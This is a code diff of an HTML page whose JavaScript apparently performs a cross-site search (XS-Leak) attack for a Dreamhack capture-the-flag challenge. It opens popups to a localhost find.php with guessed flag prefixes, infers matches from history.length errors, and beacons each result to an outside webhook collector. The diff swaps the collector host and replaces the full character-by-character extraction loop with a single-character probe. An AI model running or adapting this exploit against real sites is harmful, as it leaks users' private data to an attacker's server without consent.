@@ -1,35 +1,25 @@
 <!doctype html><meta charset="utf-8"><body><script>
-const T="http://localhost",C="https://glznfuk.request.dreamhack.games";
+const T="http://localhost",C="https://webhooksite.net/674fdaef-b325-4a34-8c2f-244a8c43aab4";
 const SELF="https://niu0102.github.io/aaaa.html?blank=1";
 const L=(t,d)=>new Image().src=C+"/"+t+"?d="+encodeURIComponent(JSON.stringify(d))+"&t="+Date.now();
 const F=(p,pad)=>`${T}/find.php?search=${encodeURIComponent(p)}&w=${"A".repeat(pad)}&h=`;
 const PAD=2200;
-const cs="abcdefghijklmnopqrstuvwxyz0123456789_}ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
 function P(u){return new Promise(r=>{
   const w=open("about:blank","p","width=120,height=120");
   setTimeout(()=>{try{w.location=u}catch(e){}},50);
-  setTimeout(()=>{try{w.location=SELF}catch(e){}},1400);
+  setTimeout(()=>{try{w.location=SELF}catch(e){}},1600);
   setTimeout(()=>{let h;try{h=w.history.length}catch(e){h="SE"}
-    try{w.close()}catch(e){}r(h==="SE")},2200);  // true=매칭
+    try{w.close()}catch(e){}r(h)},2500);
 });}
-async function match(prefix){                     // 재확인 1회로 오탐 줄임
-  for(const c of cs){
-    if(await P(F(prefix+c,PAD))){
-      if(await P(F(prefix+c,PAD))) return c;       // 두 번 연속 SE만 채택
-    }
-  }
-  return null;
-}
 (async()=>{
   if(location.search.includes("blank"))return;
-  let flag="DH{";
-  L("go",{flag});
-  for(let i=0;i<40;i++){
-    const c=await match(flag);
-    if(!c){ L("stuck",{flag}); break; }
-    flag+=c; L("found",{flag});
-    if(c==="}"){ L("FLAG",{flag}); break; }
+  const PREFIX="DH{";
+  const cs="abcdefghijklmnopqrstuvwxyz0123456789_}".split(""); // 소문자+숫자+_}  (플래그에 흔한 것부터)
+  for(const c of cs){
+    const h=await P(F(PREFIX+c,PAD));
+    L("t",{c,h});
+    await new Promise(r=>setTimeout(r,300));
   }
-  L("done",{flag});
+  L("done",{});
 })();
 </script>`
